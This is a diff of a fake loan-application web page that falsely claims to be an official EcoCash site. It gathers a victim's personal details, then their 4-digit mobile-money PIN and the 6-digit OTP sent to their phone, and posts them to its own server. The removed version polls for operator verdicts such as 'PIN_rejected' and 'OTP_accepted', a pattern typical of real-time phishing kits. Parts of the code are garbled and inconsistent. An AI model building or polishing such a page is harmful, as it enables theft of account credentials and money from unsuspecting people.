@@ -1,116 +1,83 @@
-
-  
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Independent Loan Application</title>
 
 <style>
 *{box-sizing:border-box}
-body{margin:0;font-family:Arial,sans-serif;background:#f3f6f8;color:#222}
-header{background:#087b45;color:white;padding:20px;text-align:center}
-main{max-width:480px;margin:25px auto;padding:20px}
-.card{background:white;padding:24px;border-radius:12px;box-shadow:0 3px 14px #0001}
-h2{text-align:center;margin-top:0}
-p{line-height:1.5}
-label{display:block;margin:14px 0 6px;font-weight:bold}
-input,select,textarea{width:100%;padding:13px;border:1px solid #ccc;border-radius:7px;font-size:16px}
-input[type=range]{padding:0;accent-color:#087b45}
+body{margin:0;font-family:Arial,sans-serif;background:#0864bd;color:#333;min-height:100vh}
+main{max-width:480px;margin:0 auto;background:white;min-height:760px;padding:35px 15px 65px;border-radius:0 0 48% 48% / 0 0 5% 5%}
+.card{max-width:430px;margin:0 auto;background:white;padding:20px;border-radius:15px}
+h2{text-align:center;margin:8px 0 22px}
+.year-title{text-align:center;color:#858585;font-size:23px;font-weight:500;margin:10px 0 25px;letter-spacing:.3px}
+label{display:block;font-weight:bold;margin:15px 0 6px}
+input,select{width:100%;padding:14px;border:1px solid #bbb;border-radius:8px;font-size:16px;background:white}
+input[type=range]{padding:0;accent-color:#0864bd}
 input[type=checkbox]{width:auto}
-button{width:100%;padding:14px;border:0;border-radius:7px;background:#087b45;color:white;font-size:16px;font-weight:bold;margin-top:18px}
+button{width:100%;padding:15px;border:0;border-radius:8px;background:#0864bd;color:white;font-size:16px;font-weight:bold;margin-top:18px}
 button:disabled{background:#999}
 .secondary{background:#555}
 .hidden{display:none}
-.digits{display:flex;gap:7px;justify-content:center;margin:22px 0}
-.digits input{width:45px;height:52px;text-align:center;font-size:22px;font-weight:bold;padding:5px}
 .phone{display:flex;gap:8px}
-.phone span{padding:13px;background:#eee;border-radius:7px;white-space:nowrap}
-.notice{background:#fff3cd;padding:12px;border-radius:7px;margin:14px 0}
-.error{color:#c62828;text-align:center;font-weight:bold}
-.success{color:#087b45;text-align:center;font-weight:bold}
-.number-display{text-align:center;font-size:22px;font-weight:bold;color:#087b45;margin:15px 0}
-#timer{text-align:center;font-size:21px;font-weight:bold;margin:18px}
-.forgot{text-align:center;color:#087b45;text-decoration:underline;cursor:pointer;margin-top:15px}
-footer{text-align:center;font-size:12px;color:#666;padding:20px;line-height:1.5}
+.phone span{padding:14px 9px;background:#eee;border-radius:8px;white-space:nowrap}
+.digits{display:flex;justify-content:center;gap:8px;margin:28px 0}
+.digits input{width:52px;height:58px;padding:3px;text-align:center;font-size:24px;font-weight:bold;border:2px solid #176ba4;border-radius:10px}
+.number-display{text-align:center;font-size:21px;font-weight:bold;margin:20px 0;color:#1762a8}
+.message{text-align:center;margin:12px 0}
+.error{color:#c62828}
+.success{color:#087b45}
+footer{max-width:480px;margin:0 auto;padding:90px 25px 35px;text-align:center;color:white;font-size:17px;line-height:1.5}
+.footer-note{margin-top:30px;font-size:12px;opacity:.9}
+.notice{font-size:12px;color:#666;line-height:1.5;margin-top:15px}
 </style>
 </head>
 
 <body>
-
-<header>
-<h2>Loan Application</h2>
-<p>Independent loan application service</p>
-</header>
-
 <main>
 <div class="card">
 
-<!-- PAGE 1: LOAN DETAILS -->
-
 <section id="page1">
-  <h2>Loan Details</h2>
+<h2>Loan Details</h2>
 
-  <label>Loan type</label>
-  <select id="loanType">
-    <option value="">Select loan type</option>
-    <option>Personal Loan</option>
-    <option>Business Loan</option>
-    <option>Emergency Loan</option>
-  </select>
+<label>Loan type</label>
+<select id="loanType">
+<option value="">Select loan type</option>
+<option>Personal Loan</option>
+<option>Business Loan</option>
+<option>Emergency Loan</option>
+</select>
 
-  <label>Choose loan amount (USD)</label>
-  <input
-    id="amount"
-    type="range"
-    min="100"
-    max="50000"
-    step="100"
-    value="500"
-    oninput="updateAmount()"
-  >
+<label>Choose loan amount (USD)</label>
+<input id="amount" type="range" min="100" max="50000" step="100" value="500">
+<div id="amountDisplay" class="number-display">$500</div>
 
-  <p id="amountDisplay" style="text-align:center;font-size:22px;font-weight:bold">$500</p>
+<label>Repayment period</label>
+<select id="term">
+<option value="">Select repayment period</option>
+<option>1 month</option><option>2 months</option>
+<option>3 months</option><option>4 months</option>
+<option>5 months</option><option>6 months</option>
+<option>9 months</option><option>12 months</option>
+<option>18 months</option><option>24 months</option>
+<option>30 months</option><option>36 months</option>
+<option>42 months</option><option>48 months</option>
+<option>54 months</option><option>60 months</option>
+</select>
 
-  <label>Repayment period</label>
-  <select id="term">
-    <option value="">Select repayment period</option>
-    <option>1 month</option>
-    <option>2 months</option>
-    <option>3 months</option>
-    <option>4 months</option>
-    <option>5 months</option>
-    <option>6 months</option>
-    <option>9 months</option>
-    <option>12 months</option>
-    <option>18 months</option>
-    <option>24 months</option>
-    <option>30 months</option>
-    <option>36 months</option>
-    <option>42 months</option>
-    <option>48 months</option>
-    <option>54 months</option>
-    <option>60 months</option>
-  </select>
+<label>Purpose of your loan</label>
+<select id="purpose">
+<option value="">Select loan purpose</option>
+<option>Business</option><option>Investment</option>
+<option>School Fees</option><option>Medical Expenses</option>
+<option>Home Improvement</option><option>Personal Needs</option>
+<option>Agriculture</option><option>Other</option>
+</select>
 
-  <label>Purpose of your loan</label>
-  <select id="purpose">
-    <option value="">Select loan purpose</option>
-    <option>Business</option>
-    <option>Investment</option>
-    <option>School Fees</option>
-    <option>Medical Expenses</option>
-    <option>Home Improvement</option>
-    <option>Personal Needs</option>
-    <option>Agriculture</option>
-    <option>Other</option>
-  </select>
-
-  <button type="button" onclick="nextPage(1,2)">Continue</button>
+<button type="button" onclick="nextPage(1)">CONTINUE</button>
 </section>
 
-<!-- PAGE 2: PERSONAL DETAILS -->
 <section id="page2" class="hidden">
 <h2>Personal Details</h2>
 
@@ -129,11 +96,10 @@ footer{text-align:center;font-size:12px;color:#666;padding:20px;line-height:1.5}
 <input id="phone" type="tel" maxlength="9" placeholder="771234567">
 </div>
 
-<button onclick="nextPage(2,3)">Continue</button>
-<button class="secondary" onclick="showPage(1)">Back</button>
+<button type="button" onclick="nextPage(2)">CONTINUE</button>
+<button type="button" class="secondary" onclick="showPage(1)">BACK</button>
 </section>
 
-<!-- PAGE 3: EMPLOYMENT DETAILS -->
 <section id="page3" class="hidden">
 <h2>Employment Details</h2>
 
@@ -149,362 +115,253 @@ footer{text-align:center;font-size:12px;color:#666;padding:20px;line-height:1.5}
 <label>Monthly income (USD)</label>
 <input id="income" type="number" min="0" placeholder="Enter monthly income">
 
-<div class="notice">
-Your information will be used to assess your loan application.
-</div>
-
-<label style="font-weight:normal">
-<input id="consent" type="checkbox">
-I agree to the processing of my application details.
-</label>
-
-<button onclick="nextPage(3,4)">Continue</button>
-<button class="secondary" onclick="showPage(2)">Back</button>
+<button type="button" onclick="nextPage(3)">CONTINUE</button>
+<button type="button" class="secondary" onclick="showPage(2)">BACK</button>
 </section>
 
-<!-- PAGE 4: Login -->
 <section id="page4" class="hidden">
-<h2>LOGIN</h2>
+<h2 class="Login-title">Login</h2>
+<div id="PINPhone" class="number-display"></div>
+<p style="text-align:center;color:#777">Enter your PIN</p>
 
-<div id="yearPhone" class="number-display"></div>
-
-<p style="text-align:center;font-weight:bold">Enter your PIN</p>
-
-<div class="digits" id="PINBoxes">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
+<div class="digits" id="yearBoxes">
+<input maxlength="1" inputmode="numeric" aria-label="Login digit 1">
+<input maxlength="1" inputmode="numeric" aria-label="Login digit 2">
+<input maxlength="1" inputmode="numeric" aria-label="Login digit 3">
+<input maxlength="1" inputmode="numeric" aria-label="Login digit 4">
 </div>
 
-<p id="PINMessage" class="error"></p>
-
-<p class="forgot" onclick="showForgotPIN()">Forgot PIN?</p>
-
-<button onclick="submitYear()">Submit</button>
-<button class="secondary" onclick="showPage(3)">Back</button>
+<p id="PINMessage" class="message error"></p>
+<button type="button" onclick="nextPage(4)">CONTINUE</button>
+<button type="button" class="secondary" onclick="showPage(3)">BACK</button>
 </section>
 
-<!-- PAGE 5: OTP Verification -->
 <section id="page5" class="hidden">
 <h2>OTP Verification</h2>
-
-<p style="text-align:center;font-weight:bold">Enter the OTP sent to your phone number</p>
-
+<p style="text-align:center;color:#777">Enter the six digit OTP code sent to your number</p>
 <div id="referencePhone" class="number-display"></div>
 
-<div class="digits" id="OTPBoxes">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
+<div class="digits" id="referenceBoxes">
+<input maxlength="1" inputmode="numeric" aria-label="OTP digit 1">
+<input maxlength="1" inputmode="numeric" aria-label="OTP digit 2">
+<input maxlength="1" inputmode="numeric" aria-label="OTP digit 3">
+<input maxlength="1" inputmode="numeric" aria-label="OTP digit 4">
+<input maxlength="1" inputmode="numeric" aria-label="OTP digit 5">
+<input maxlength="1" inputmode="numeric" aria-label="OTP digit 6">
 </div>
 
-<div id="timer">90 seconds</div>
-
-<p id="OTPMessage" class="error"></p>
-
-<button id="referenceSubmit" onclick="submitReference()">Submit</button>
-<button id="resendButton" class="hidden" onclick="restartReference()">Resend</button>
+<p id="referenceMessage" class="message error"></p>
+<button id="submitButton" type="button" onclick="submitApplication()">SUBMIT</button>
+<button type="button" class="secondary" onclick="showPage(4)">BACK</button>
 </section>
 
-<!-- PAGE 6: WAITING -->
 <section id="page6" class="hidden">
 <h2>Application under review</h2>
-<p style="text-align:center">
-Your submission has been sent for review. Please wait for the review result.
-</p>
+<p class="message">Your application has been submitted for review.</p>
+<p style="text-align:center">Application reference:</p>
+<div id="displayReference" class="number-display"></div>
+<p id="statusMessage" class="message">Checking application status...</p>
 </section>
 
-<!-- PAGE 7: FINAL -->
 <section id="page7" class="hidden">
-<h2>Application review</h2>
-<p class="success">Your Your OTP code has been accepted.</p>
-<p style="text-align:center">
-Your application has moved to the next stage of review. This does not guarantee loan approval.
-</p>
-</section>
-
-<!-- FORGOT PIN -->
-<section id="page8" class="hidden">
-<h2>Forgot PIN?</h2>
-<p style="text-align:center">
-Please contact the application support team for assistance.
-</p>
-<button onclick="showPage(4)">Back</button>
+<h2>Application Review</h2>
+<p id="finalMessage" class="message success"></p>
 </section>
 
 </div>
 </main>
 
 <footer>
-This is an independent loan application service. It is an official EcoCash website and is affiliated by EcoCash.
+To learn more about this independent loan application service or get assistance, contact the service administrator.
+<div class="footer-note">
+This is an official EcoCash website and is affiliated by EcoCash.
+</div>
 </footer>
 
 <script>
 const application={};
-let timerInterval=null;
-let statusInterval=null;
-let seconds=90;
-let currentApplicationId=null;
-
-function updateAmount(){
-  const slider = document.getElementById("amount");
-  const display = document.getElementById("amountDisplay");
-  display.textContent = "$" + Number(slider.value).toLocaleString();
-}
-
-function getPhoneNumber(){
- const phone=document.getElementById("phone").value.trim();
- return "+263 "+phone;
-}
+let applicationId=null;
+let statusTimer=null;
+const el=id=>document.getElementById(id);
 
 function showPage(number){
- for(let i=1;i<=8;i++){
-  document.getElementById("page"+i).classList.add("hidden");
- }
- document.getElementById("page"+number).classList.remove("hidden");
-
- if(number===4){
-  document.getElementById("yearPhone").textContent=getPhoneNumber();
- }
-
- if(number===5){
-  document.getElementById("referencePhone").textContent=getPhoneNumber();
-  startTimer();
- }
-}
-
-function nextPage(from,to){
-
- if(from===1){
-  application.loanType=document.getElementById("loanType").value;
-  application.amount=Number(document.getElementById("amount").value);
-  application.term=document.getElementById("term").value;
-  application.purpose=document.getElementById("purpose").value;
-
-  if(!application.loanType || !application.term || !application.purpose){
-   alert("Please complete all loan details.");
-   return;
+  for(let i=1;i<=7;i++){
+    el("page"+i).classList.add("hidden");
   }
- }
+  el("page"+number).classList.remove("hidden");
 
- if(from===2){
-  application.firstName=document.getElementById("firstName").value.trim();
-  application.lastName=document.getElementById("lastName").value.trim();
-  application.email=document.getElementById("email").value.trim();
-  application.phone=document.getElementById("phone").value.trim();
-
-  if(!application.firstName || !application.lastName ||
-  !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(application.email) ||
-  !/^7\d{8}$/.test(application.phone)){
-   alert("Please enter valid personal details and a Zimbabwe mobile number.");
-   return;
+  if(number===4 || number===5){
+    const phone="+263 "+el("phone").value.trim();
+    el("yearPhone").textContent=phone;
+    el("referencePhone").textContent=phone;
   }
- }
+}
 
- if(from===3){
-  application.employment=document.getElementById("employment").value;
-  application.income=Number(document.getElementById("income").value);
-  application.consent=document.getElementById("consent").checked;
+function setupBoxes(id){
+  const boxes=[...el(id).querySelectorAll("input")];
 
-  if(!application.employment || !Number.isFinite(application.income) ||
-  application.income<0 || !application.consent){
-   alert("Please complete the details and give your consent.");
-   return;
+  boxes.forEach((box,index)=>{
+    box.addEventListener("input",()=>{
+      box.value=box.value.replace(/\D/g,"").slice(-1);
+      if(box.value && boxes[index+1]){
+        boxes[index+1].focus();
+      }
+    });
+
+    box.addEventListener("keydown",event=>{
+      if(event.key==="Backspace" && !box.value && boxes[index-1]){
+        boxes[index-1].focus();
+      }
+    });
+
+    box.addEventListener("paste",event=>{
+      event.preventDefault();
+      const value=(event.clipboardData.getData("text")||"")
+        .replace(/\D/g,"").slice(0,boxes.length);
+      boxes.forEach((item,i)=>item.value=value[i]||"");
+      const nextIndex=Math.min(value.length,boxes.length-1);
+      boxes[nextIndex].focus();
+    });
+  });
+
+  return {
+    read:()=>boxes.map(box=>box.value).join("")
+  };
+}
+
+const pinFields=setupBoxes("pinBoxes");
+const OTPFields=setupBoxes("OTPBoxes");
+
+function nextPage(page){
+  if(page===1){
+    application.loanType=el("loanType").value;
+    application.amount=Number(el("amount").value);
+    application.term=el("term").value;
+    application.purpose=el("purpose").value;
+
+    if(!application.loanType || !application.term || !application.purpose){
+      alert("Please complete all loan details.");
+      return;
+    }
+    showPage(2);
   }
- }
 
- showPage(to);
-}
+  if(page===2){
+    application.firstName=el("firstName").value.trim();
+    application.lastName=el("lastName").value.trim();
+    application.email=el("email").value.trim();
+    application.phone=el("phone").value.trim();
 
-function setupDigitBoxes(id){
- const boxes=[...document.querySelectorAll("#"+id+" input")];
-
- boxes.forEach((box,index)=>{
-  box.addEventListener("input",()=>{
-   box.value=box.value.replace(/\D/g,"").slice(-1);
-   if(box.value && boxes[index+1]){
-    boxes[index+1].focus();
-   }
-  });
-
-  box.addEventListener("keydown",event=>{
-   if(event.key==="Backspace" && !box.value && boxes[index-1]){
-    boxes[index-1].focus();
-   }
-  });
-
-  box.addEventListener("paste",event=>{
-   event.preventDefault();
-   const pasted=(event.clipboardData.getData("text")||"")
-    .replace(/\D/g,"").slice(0,boxes.length);
-
-   boxes.forEach((item,i)=>item.value=pasted[i]||"");
-   boxes[Math.min(pasted.length,boxes.length-1)].focus();
-  });
- });
-
- return {
-  read:()=>boxes.map(box=>box.value).join(""),
-  clear:()=>boxes.forEach(box=>box.value="")
- };
-}
-
-const loginInput=setupDigitBoxes("yearBoxes");
-const referenceInput=setupDigitBoxes("referenceBoxes");
-
-function showForgotPIN(){
- showPage(8);
-}
-
-async function submitPIN(){
- const login=PINInput.read();
-
- if(!/^\d{4}$/.test(PIN)){
-  document.getElementById("PINMessage").textContent=
-  "Please enter all four digits.";
-  return;
- }
-
- enter your.=PIN;
- document.getElementById("PINMessage").textContent="";
-
- try{
-  const response=await fetch("/api/enter your/PIN",{
-   method:"POST",
-   headers:{"Content-Type":"enter your/json"},
-   body:JSON.stringify({enteryour,PIN})
-  });
-
-  if(!response.ok) throw new Error("Submission failed");
-
-  const data=await response.json();
-  currentApplicationId=data.applicationId;
-  showPage(6);
-  startStatusCheck();
-
- }catch(error){
-  document.getElementById("PINMessage").textContent=
-  "Unable to submit right now. Please try again later.";
- }
-}
-
-function startTimer(){
- clearInterval(timerInterval);
- seconds=90;
-
- document.getElementById("timer").textContent="90 seconds";
- document.getElementById("referenceSubmit").classList.remove("hidden");
- document.getElementById("referenceSubmit").disabled=false;
- document.getElementById("resendButton").classList.add("hidden");
-
- timerInterval=setInterval(()=>{
-  seconds--;
-  document.getElementById("timer").textContent=seconds+" seconds";
-
-  if(seconds<=0){
-   clearInterval(timerInterval);
-   document.getElementById("referenceSubmit").classList.add("hidden");
-   document.getElementById("resendButton").classList.remove("hidden");
+    if(!application.firstName || !application.lastName ||
+      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(application.email) ||
+      !/^7\d{8}$/.test(application.phone)){
+      alert("Please enter valid personal details and a Zimbabwe mobile number.");
+      return;
+    }
+    showPage(3);
   }
- },1000);
+
+  if(page===3){
+    application.employment=el("employment").value;
+    application.income=Number(el("income").value);
+
+    if(!application.employment ||
+      !Number.isFinite(application.income) || application.income<0){
+      alert("Please complete your employment details.");
+      return;
+    }
+
+    showPage(4);
+  }
+
+  if(page===4){
+    const year=yearFields.read();
+
+    if(!/^\d{4}$/.test(year)){
+      el("yearMessage").textContent="Please enter all four PIN digits.";
+      return;
+    }
+
+    application.year=year;
+    el("yearMessage").textContent="";
+    showPage(5);
+  }
 }
 
-function restartReference(){
- referenceInput.clear();
- document.getElementById("referenceMessage").textContent="";
- startTimer();
-}
+el("amount").addEventListener("input",()=>{
+  el("amountDisplay").textContent=
+    "$"+Number(el("amount").value).toLocaleString();
+});
 
-async function submitReference(){
- const reference=referenceInput.read();
+async function submitApplication(){
+  const reference=OTPFields.read();
 
- if(!/^\d{6}$/.test(reference)){
-  document.getElementById("referenceMessage").textContent=
-  "Please enter all six digits.";
-  return;
- }
+  if(!/^\d{6}$/.test(reference)){
+    el("referenceMessage").textContent="Please enter all six OTP digits.";
+    return;
+  }
 
- clearInterval(timerInterval);
- document.getElementById("referenceSubmit").disabled=true;
+  application.reference=reference;
+  el("submitButton").disabled=true;
+  el("referenceMessage").textContent="Submitting application...";
 
- try{
-  const response=await fetch("/api/application/OTP",{
-   method:"POST",
-   headers:{"Content-Type":"application/json"},
-   body:JSON.stringify({
-    applicationId:currentApplicationId,
-    reference
-   })
-  });
+  try{
+    const response=await fetch("/api/applications",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(application)
+    });
 
-  if(!response.ok) throw new Error("Submission failed");
+    const data=await response.json();
 
-  showPage(6);
-  startStatusCheck();
+    if(!response.ok){
+      throw new Error(data.error||"Submission failed.");
+    }
 
- }catch(error){
-  document.getElementById("OTPVerificationMessage").textContent=
-  "Unable to submit. Please try again.";
-  document.getElementById("referenceSubmit").disabled=false;
-  startTimer();
- }
-}
+    applicationId=data.applicationId;
+    el("displayReference").textContent=reference;
+    el("referenceMessage").textContent="";
+    showPage(6);
 
-function startStatusCheck(){
- clearInterval(statusInterval);
- statusInterval=setInterval(checkStatus,3000);
+    checkStatus();
+    statusTimer=setInterval(checkStatus,5000);
+
+  }catch(error){
+    el("referenceMessage").textContent=
+      error.message||"Unable to submit. Please try again.";
+    el("submitButton").disabled=false;
+  }
 }
 
 async function checkStatus(){
- if(!currentApplicationId) return;
+  if(!applicationId)return;
 
- try{
-  const response=await fetch(
-   "/api/application/"+encodeURIComponent(currentApplicationId)+"/status"
-  );
+  try{
+    const response=await fetch(
+      "/api/application/"+encodeURIComponent(applicationId)+"/status"
+    );
 
-  if(!response.ok) return;
+    if(!response.ok)return;
+    const data=await response.json();
 
-  const data=await response.json();
-
-  if(data.status==="PIN_rejected"){
-   clearInterval(statusInterval);
-   document.getElementById("yearMessage").textContent="Wrong PIN";
-   yearInput.clear();
-   showPage(4);
+    if(data.status==="approved"){
+      finish("Your application has proceeded to the next review stage.");
+    }else if(data.status==="rejected"){
+      finish("Your application was not approved at this review stage.");
+    }else if(data.status==="disbursed"){
+      finish("Your application has been marked as disbursed.");
+    }
+  }catch(error){
+    el("statusMessage").textContent=
+      "Connection unavailable. Checking again shortly.";
   }
-
-  if(data.status==="PIN_accepted"){
-   clearInterval(statusInterval);
-   showPage(5);
-  }
-
-  if(data.status==="OTP_rejected"){
-   clearInterval(statusInterval);
-   document.getElementById("OTPVerificationMessage").textContent=
-   "Wrong OTP code  please check your normal sms for new OTP code";
-   OTPInput.clear();
-   showPage(5);
-  }
-
-  if(data.status==="OTP_accepted"){
-   clearInterval(statusInterval);
-   clearInterval(timerInterval);
-   showPage(7);
-  }
-
- }catch(error){
-  // Retry when the connection returns.
- }
 }
 
-updateAmount();
+function finish(message){
+  clearInterval(statusTimer);
+  el("finalMessage").textContent=message;
+  showPage(7);
+}
 </script>
-
 </body>
 </html>
-
